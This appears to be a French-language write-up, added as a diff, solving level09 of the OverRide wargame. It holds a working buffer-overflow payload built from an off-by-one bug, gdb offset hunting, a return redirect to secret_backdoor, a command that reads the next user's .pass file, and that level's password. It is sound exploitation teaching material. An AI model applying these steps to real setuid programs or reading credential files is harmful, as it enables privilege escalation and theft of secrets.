@@ -1,0 +1,189 @@
+level09@OverRide:~$ file level09
+level09: setuid setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xa1a3a49786f29814c5abd4fc6d7a685800a3d454, not stripped
+level09@OverRide:~$ ls
+level09
+level09@OverRide:~$
+
+level09@OverRide:~$ ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: hey
+>: Welcome, hey
+>: Msg @Unix-Dude
+>>: mhhh
+>: Msg sent!
+level09@OverRide:~$
+
+en decompilant avec https://dogbolt.org/?id=f1613b2e-2c3d-4b75-97e9-8137a7378884#Boomerang=8&Ghidra=503&Hex-Rays=202&angr=102&Relyze=1&RetDec=22&Snowman=8332&BinaryNinja=366
+
+on voit tout de suite la fonction secret_backdoor qui nous permettra d'executer n'importe quel commande avec les droit de end 
+
+level09@OverRide:~$ ls -l
+total 16
+-rwsr-s---+ 1 end users 12959 Oct  2  2016 level09
+level09@OverRide:~$
+level09@OverRide:~$ file level09
+level09: setuid setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xa1a3a49786f29814c5abd4fc6d7a685800a3d454, not stripped
+
+
+avec la boucle for:
+
+  for ( i = 0; i <= 40 && s[i] != 0; ++i )
+    a1->username[i] = s[i];
+
+qui vas a 1 de trop a cause de i <= 40 au lieu de i < 40
+
+on peut overwrite la variable suivante:
+    char username[40];      // offset 140 (0x8C)
+    int  max_msg_len;       // offset 180 (0xB4)
+
+et donc modifier max_msg_len car il font partie de la meme structure
+
+  data.max_msg_len = 140;
+
+mais il faut transformer le 140 en la plus grande valeur possible en 1octets
+ff == 255 par exemple
+
+(python -c 'import sys; sys.stdout.write(b"A"*40 + b"\xff" + b"\n")'; cat)| ./level09
+
+level09@OverRide:~$ (python -c 'import sys; sys.stdout.write(b"A"*40 + b"\xff" + b"\n")'; cat)| ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4
+>>: >: Msg sent!
+
+Segmentation fault (core dumped)
+level09@OverRide:~$
+
+j'ai reussi a overide eip
+
+teston dans gdb 
+
+run < <(python -c 'import sys; sys.stdout.write(b"A"*40 + b"\xff" + b"\n")'; cat)
+
+comme le binaire est PIE
+level09@OverRide:~$ readelf -h ./level09 | grep Type
+  Type:                              DYN (Shared object file)
+
+(gdb) disassemble set_msg
+Dump of assembler code for function set_msg:
+   0x0000000000000932 <+0>:     push   %rbp
+   0x0000000000000933 <+1>:     mov    %rsp,%rbp
+   0x0000000000000936 <+4>:     sub    $0x410,%rsp
+   0x000000000000093d <+11>:    mov    %rdi,-0x408(%rbp)
+   0x0000000000000944 <+18>:    lea    -0x400(%rbp),%rax
+   0x000000000000094b <+25>:    mov    %rax,%rsi
+   0x000000000000094e <+28>:    mov    $0x0,%eax
+   0x0000000000000953 <+33>:    mov    $0x80,%edx
+   0x0000000000000958 <+38>:    mov    %rsi,%rdi
+   0x000000000000095b <+41>:    mov    %rdx,%rcx
+   0x000000000000095e <+44>:    rep stos %rax,%es:(%rdi)
+   0x0000000000000961 <+47>:    lea    0x265(%rip),%rdi        # 0xbcd
+   0x0000000000000968 <+54>:    callq  0x730 <puts@plt>
+   0x000000000000096d <+59>:    lea    0x26b(%rip),%rax        # 0xbdf
+   0x0000000000000974 <+66>:    mov    %rax,%rdi
+   0x0000000000000977 <+69>:    mov    $0x0,%eax
+   0x000000000000097c <+74>:    callq  0x750 <printf@plt>
+   0x0000000000000981 <+79>:    mov    0x201630(%rip),%rax        # 0x201fb8
+   0x0000000000000988 <+86>:    mov    (%rax),%rax
+   0x000000000000098b <+89>:    mov    %rax,%rdx
+   0x000000000000098e <+92>:    lea    -0x400(%rbp),%rax
+   0x0000000000000995 <+99>:    mov    $0x400,%esi
+   0x000000000000099a <+104>:   mov    %rax,%rdi
+   0x000000000000099d <+107>:   callq  0x770 <fgets@plt>
+   0x00000000000009a2 <+112>:   mov    -0x408(%rbp),%rax
+   0x00000000000009a9 <+119>:   mov    0xb4(%rax),%eax
+   0x00000000000009af <+125>:   movslq %eax,%rdx
+   0x00000000000009b2 <+128>:   lea    -0x400(%rbp),%rcx
+   0x00000000000009b9 <+135>:   mov    -0x408(%rbp),%rax
+   0x00000000000009c0 <+142>:   mov    %rcx,%rsi
+   0x00000000000009c3 <+145>:   mov    %rax,%rdi
+   0x00000000000009c6 <+148>:   callq  0x720 <strncpy@plt>
+   0x00000000000009cb <+153>:   leaveq
+   0x00000000000009cc <+154>:   retq
+End of assembler dump.
+(gdb) b set_msg:154
+No symbol table is loaded.  Use the "file" command.
+Make breakpoint pending on future shared library load? (y or [n]) y
+Breakpoint 1 (set_msg:154) pending.
+(gdb) run < <(python -c 'import sys; sys.stdout.write(b"A"*40 + b"\xff" + b"\n")'; cat)
+Starting program: /home/users/level09/level09 < <(python -c 'import sys; sys.stdout.write(b"A"*40 + b"\xff" + b"\n")'; cat)
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4
+>>: >: Msg sent!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000555555554931 in handle_msg ()
+(gdb)  r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) n
+Program not restarted.
+(gdb) i r
+rax            0xd      13
+rbx            0x0      0
+rcx            0x7ffff7b01f90   140737348902800
+rdx            0x7ffff7dd5a90   140737351867024
+rsi            0x7ffff7ff7000   140737354100736
+rdi            0xffffffff       4294967295
+rbp            0x6741356741346741       0x6741356741346741
+rsp            0x7fffffffe5c8   0x7fffffffe5c8
+r8             0x7ffff7ff7004   140737354100740
+r9             0xc      12
+r10            0x21     33
+r11            0x246    582
+r12            0x555555554790   93824992233360
+r13            0x7fffffffe6b0   140737488348848
+r14            0x0      0
+r15            0x0      0
+rip            0x555555554931   0x555555554931 <handle_msg+113>
+eflags         0x10246  [ PF ZF IF RF ]
+cs             0x33     51
+ss             0x2b     43
+ds             0x0      0
+es             0x0      0
+fs             0x0      0
+gs             0x0      0
+(gdb) x/wx 0x7fffffffe5c8
+0x7fffffffe5c8: 0x37674136
+(gdb)
+
+
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+0x37674136 == offset 200 donc on sait qu'il y auras 200octets avant de pouvoir overide eip
+
+(gdb) info functions
+...
+0x000055555555488c  secret_backdoor
+0x00005555555548c0  handle_msg
+0x0000555555554932  set_msg
+0x00005555555549cd  set_username
+0x0000555555554aa8  main
+...
+
+
+mais aslr est desactiver 
+level09@OverRide:~$ cat /proc/sys/kernel/randomize_va_space
+0
+
+0x000055555555488c  secret_backdoor
+
+
+level09@OverRide:~$ (python /tmp/sc.py; cat) | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+cat /home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
